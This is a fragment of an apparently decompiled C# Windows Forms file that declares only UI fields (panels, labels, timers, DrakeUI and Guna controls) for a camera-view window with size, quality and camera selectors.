		internal global::System.Windows.Forms.Timer TOpacity;

		// Token: 0x040002F3 RID: 755
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Panel1")]
		internal global::System.Windows.Forms.Panel Panel1;

		// Token: 0x040002F4 RID: 756
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Panel2")]
		internal global::System.Windows.Forms.Panel Panel2;

		// Token: 0x040002F5 RID: 757
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("ClientPic")]
		internal global::System.Windows.Forms.PictureBox ClientPic;

		// Token: 0x040002F6 RID: 758
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label1")]
		internal global::System.Windows.Forms.Label Label1;

		// Token: 0x040002F7 RID: 759
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("cmbofoucs")]
		internal global::System.Windows.Forms.ComboBox cmbofoucs;

		// Token: 0x040002F8 RID: 760
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Label2")]
		internal global::System.Windows.Forms.Label Label2;

		// Token: 0x040002F9 RID: 761
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("Panel4")]
		internal global::System.Windows.Forms.Panel Panel4;

		// Token: 0x040002FA RID: 762
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("statustext")]
		internal global::System.Windows.Forms.Label statustext;

		// Token: 0x040002FB RID: 763
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("ToolTip1")]
		internal global::System.Windows.Forms.ToolTip ToolTip1;

		// Token: 0x040002FC RID: 764
		internal global::DrakeUI.Framework.DrakeUIButton Sbtn;

		// Token: 0x040002FD RID: 765
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("DrakeUILampLED1")]
		internal global::DrakeUI.Framework.DrakeUILampLED DrakeUILampLED1;

		// Token: 0x040002FE RID: 766
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("DrakeUIToolTip1")]
		internal global::DrakeUI.Framework.DrakeUIToolTip DrakeUIToolTip1;

		// Token: 0x040002FF RID: 767
		internal global::DrakeUI.Framework.DrakeUIAvatar DrakeUIAvatar2;

		// Token: 0x04000300 RID: 768
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("combotext")]
		internal global::System.Windows.Forms.Label combotext;

		// Token: 0x04000301 RID: 769
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("combosizes")]
		internal global::DrakeUI.Framework.DrakeUIComboBox combosizes;

		// Token: 0x04000302 RID: 770
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("qultytext")]
		internal global::System.Windows.Forms.Label qultytext;

		// Token: 0x04000303 RID: 771
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("comboqualty")]
		internal global::DrakeUI.Framework.DrakeUIComboBox comboqualty;

		// Token: 0x04000304 RID: 772
		internal global::System.Windows.Forms.Timer savetimer;

		// Token: 0x04000305 RID: 773
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("fpstext")]
		internal global::System.Windows.Forms.Label fpstext;

		// Token: 0x04000306 RID: 774
		[global::System.Runtime.CompilerServices.AccessedThroughProperty("combocam")]
		internal global::DrakeUI.Framework.DrakeUIComboBox combocam;

		// Token: 0x04000307 RID: 775
		internal global::DrakeUI.Framework.DrakeUIButton startbtn;

		// Token: 0x04000308 RID: 776
		internal global::DrakeUI.Framework.DrakeUIButtonIcon drakeUIButtonIcon2;

		// Token: 0x04000309 RID: 777
		internal global::DrakeUI.Framework.DrakeUIButtonIcon drakeUIButtonIcon1;

		// Token: 0x0400030A RID: 778
		internal global::System.Windows.Forms.Panel Panel3;

		// Token: 0x0400030B RID: 779
		internal global::DrakeUI.Framework.DrakeUIButtonIcon pinbtn;

		// Token: 0x0400030C RID: 780
		internal global::DrakeUI.Framework.DrakeUIButtonIcon hidetoolbtn;

		// Token: 0x0400030D RID: 781
		internal global::DrakeUI.Framework.DrakeUIAvatar Button3;

		// Token: 0x0400030E RID: 782
		private global::Guna.UI2.WinForms.Guna2ControlBox guna2ControlBox1;

		// Token: 0x0400030F RID: 783
		private global::Guna.UI2.WinForms.Guna2BorderlessForm guna2BorderlessForm1;
	}
}
